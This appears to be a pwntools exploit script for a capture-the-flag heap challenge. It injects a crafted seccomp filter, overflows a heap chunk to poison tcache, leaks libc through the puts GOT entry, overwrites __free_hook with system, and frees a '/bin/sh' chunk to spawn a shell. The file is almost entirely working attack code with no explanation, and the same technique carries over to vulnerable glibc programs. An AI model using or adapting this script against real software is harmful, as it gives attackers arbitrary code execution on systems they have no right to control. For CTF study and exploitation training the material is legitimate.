from pwn import *
context(arch = 'amd64', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
        gdb.attach(io)
        pause()

sd   = lambda s    : io.send(s)
sda  = lambda s, n : io.sendafter(s, n)
sl   = lambda s    : io.sendline(s)
sla  = lambda s, n : io.sendlineafter(s, n)
rc   = lambda n    : io.recv(n)
rut  = lambda s    : io.recvuntil(s, drop=True)
ruf  = lambda s    : io.recvuntil(s, drop=False)
addr = lambda s    : u64(io.recvuntil(s, drop=True).ljust(8, b'\x00'))
byte = lambda n    : str(n).encode()
sh   = lambda      : io.interactive()

filter0  = b" \x00\x00\x00\x00\x00\x00\x00"
filter0 += b"\x15\x00\x02\x00\x01\x01\x00\x00\x15\x00\x02\x00\x01\x00\x00\x00"
filter0 += b"\x06\x00\x00\x00\x00\x00\xFF\x7F\x06\x00\x00\x00\x00\x00\x05\x00"
filter0 += b"\x06\x00\x00\x00\x00\x00\xFF\x7F"

menu = b'Your choice: '
def cmd(cmd, idx):
	sla(menu, byte(cmd))
	sla(b'Index: ', byte(idx))
	
def add(idx):
	cmd(1, idx)

def show(idx):
	cmd(2, idx)

def dele(idx):
	cmd(3, idx)
	
def edit(idx, size, content):
	cmd(4, idx)
	sla(b'Size: ', byte(size))
	sd(content)

def vip(name):
	sla(menu, b'6')
	sda(b'name: \n', name)	

payload = cyclic(0x20) + filter0
print("payload len : ", hex(len(payload)))
vip(payload)

add(0)
add(1)
add(2)
add(3)

dele(3)
dele(2)
dele(1)

puts_got = elf.got['puts']
payload = b'A'*0x50 + p64(0) + p64(0x61) + p64(puts_got)
edit(0, len(payload), payload)
add(1)
add(10)
show(10)
libc.address = u64(rc(6).ljust(8, b'\x00')) - libc.symbols['puts']
system = libc.symbols['system']
free_hook = libc.symbols['__free_hook']
print("libc_base : ", hex(libc.address))
print("system : ", hex(system))
print("free_hook : ", hex(free_hook))

"""
rcx == NULL
[rsp+0x40] == NULL
[rsp+0x70] == NULL
"""
one = [0x4f2c5, 0x4f322, 0x10a38c]
ones = [i+libc.address for i in one]

dele(1)
payload = b'A'*0x50 + p64(0) + p64(0x61) + p64(free_hook)
edit(0, len(payload), payload)
add(1)
add(9)
edit(9, 8, p64(system))
edit(1, 8, b'/bin/sh\x00')
dele(1)

#debug()

sh()


